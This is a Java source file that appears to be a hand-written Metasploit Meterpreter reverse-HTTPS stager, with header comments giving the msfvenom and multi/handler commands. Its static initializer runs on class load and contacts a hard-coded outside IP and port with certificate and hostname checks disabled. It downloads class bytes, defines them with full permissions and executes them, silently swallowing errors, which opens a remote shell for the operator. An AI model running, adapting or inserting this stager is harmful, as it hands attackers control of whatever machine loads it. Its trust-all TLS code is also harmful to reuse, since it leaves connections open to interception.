import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.StringTokenizer;

/**
 * https://github.com/Ramos-dev/R9000
 * msfvenom -p java/meterpreter/reverse_https LHOST=104.199.135.46 LPORT=65123 -f raw > https.jar
 * jar -xvf https.jar && tail metasploit.dat
 *
 * use exploits/multi/handler
 * set PAYLOAD java/meterpreter/reverse_https
 * set LHOST 0.0.0.0
 * set LPORT 65123
 * exploit
 *
 */
public class MSFPayload extends ClassLoader implements X509TrustManager, HostnameVerifier {

    static {
        try {
            InputStream inputStream2 = null;
            String payload = "https://104.199.135.46:65123/YOZLwXzGLZtQT1ReMklMnQJYLAIQM0luSnpPZerSZ-k5_pJpuFDyYrdy20gPvDPJuSVQJHDFzaTHD7EhBMZzX2aWLun34ToAYkkcUmjs2MvKrfTrUgbVKNyiD9uHNxQGg0cdhmXj0Ayf-w1N0MBbi91BzsirY9MaX6RZM6b6S7u0GZin9BrEYQnDqqGrpNke3Feitk_PSUT4hD2ntqAAj9z8MX3VmzFiVUe";
            if ( payload.startsWith( "https" ) ) {
                URLConnection obj = new URL( payload ).openConnection();
                useFor( obj );
                inputStream2 = ( obj ).getInputStream();
            }else {
                inputStream2 = new URL( payload ).openStream();
            }
            OutputStream outputStream  = new ByteArrayOutputStream();

            Object localObject6 = new StringTokenizer( "Payload -- " + "", " " );
            String[] arrayOfString = new String[( (StringTokenizer) localObject6 ).countTokens()];
            for ( int m = 0; m < arrayOfString.length; m++ ) {
                arrayOfString[m] = ( (StringTokenizer) localObject6 ).nextToken();
            }
            new MSFPayload().bootstrap( inputStream2, outputStream, null, arrayOfString );
        }
        catch (Exception e) {
        }
    }

    public final void bootstrap( InputStream inputStream, OutputStream outputStream, String string, String[] arrstring)throws Exception {
        try {
            Class<?> class_ = null;
            DataInputStream dataInputStream = new DataInputStream( inputStream );
            Permissions permissions = new Permissions();
            permissions.add( new AllPermission() );
            ProtectionDomain protectionDomain = new ProtectionDomain( new CodeSource( new URL( "file:///" ), new Certificate[0] ), permissions );
            if ( string == null ) {
                int n = dataInputStream.readInt();
                do {
                    byte[] arrby = new byte[n];
                    dataInputStream.readFully( arrby );
                    class_ = this.defineClass( null, arrby, 0, n, protectionDomain );
                    this.resolveClass( class_ );
                }
                while ( ( n = dataInputStream.readInt() ) > 0 );
            }

            Object obj = class_.newInstance();
            class_.getMethod( "start", DataInputStream.class, OutputStream.class, String[].class ).invoke( obj, dataInputStream,  outputStream, arrstring );
        }
        catch ( Throwable throwable ){
            throwable.printStackTrace( new PrintStream( outputStream ) );
        }
    }

    @Override
    public boolean verify(String s, SSLSession sslSession){
        return true;
    }

    @Override
    public void checkClientTrusted( X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public void checkServerTrusted( X509Certificate[] x509Certificates, String s ) throws CertificateException {}

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public static void useFor( URLConnection paramURLConnection ) throws Exception {
        if ( ( paramURLConnection instanceof HttpsURLConnection )){
            HttpsURLConnection localHttpsURLConnection = (HttpsURLConnection) paramURLConnection;
            MSFPayload localPayloadTrustManager = new MSFPayload();
            SSLContext localSSLContext = SSLContext.getInstance( "SSL" );
            localSSLContext.init( null, new TrustManager[] { localPayloadTrustManager }, new SecureRandom() );
            localHttpsURLConnection.setSSLSocketFactory( localSSLContext.getSocketFactory() );
            localHttpsURLConnection.setHostnameVerifier( localPayloadTrustManager );
        }
    }

    public static class MemoryBufferURLConnection extends URLConnection {
        private static List files;
        private final byte[] data;
        private final String contentType;
        protected MemoryBufferURLConnection( URL uRL )
        {
            super( uRL );
            String string = uRL.getFile();
            int n = string.indexOf( 47 );
            List list = files;
            synchronized (list){
                this.data = (byte[]) files.get( Integer.parseInt( string.substring( 0, n ) ) );
            }
            this.contentType = string.substring( n + 1 );
        }

        static {
            files = new ArrayList();
            try {
                Map map;
                Field field;
                try {
                    field = URL.class.getDeclaredField( "handlers" );
                }
                catch (NoSuchFieldException noSuchFieldException ) {
                    try{
                        field = URL.class.getDeclaredField( "ph_cache" );
                    }
                    catch ( NoSuchFieldException noSuchFieldException2 ){
                        throw noSuchFieldException;
                    }
                }
                field.setAccessible( true );
                Map map2 = map = (Map) field.get( null );
                synchronized ( map2 ){
                    Object object;
                    if ( map.containsKey( "metasploitmembuff" )) {
                        object = map.get( "metasploitmembuff" );
                    }
                    else {
                        object = new MemoryBufferURLStreamHandler();
                        map.put( "metasploitmembuff", object );
                    }
                    files = (List) object.getClass().getMethod( "getFiles", new Class[0] ).invoke(object, new Object[0] );
                }
            }
            catch ( Exception exception ) {
                throw new RuntimeException( exception.toString() );
            }
        }

        public void connect() throws IOException {
        }

        public InputStream getInputStream() throws IOException {
            return new ByteArrayInputStream( this.data );
        }

        public static URL createURL(byte[] arrby, String string)throws MalformedURLException {
            List list = files;
            synchronized (list) {
                files.add( arrby );
                return new URL( "metasploitmembuff", "", "" + ( files.size() - 1 ) + "/" + string );
            }
        }

        public int getContentLength(){
            return this.data.length;
        }

        public String getContentType(){
            return this.contentType;
        }
    }

    public static class MemoryBufferURLStreamHandler extends URLStreamHandler
    {
        private List files = new ArrayList();

        protected URLConnection openConnection( URL uRL ) throws IOException {
            return new MemoryBufferURLConnection( uRL );
        }

        public List getFiles() {
            return this.files;
        }
    }

    public static void main(String[] args) throws Throwable {
        MSFPayload t = new MSFPayload();
    }
}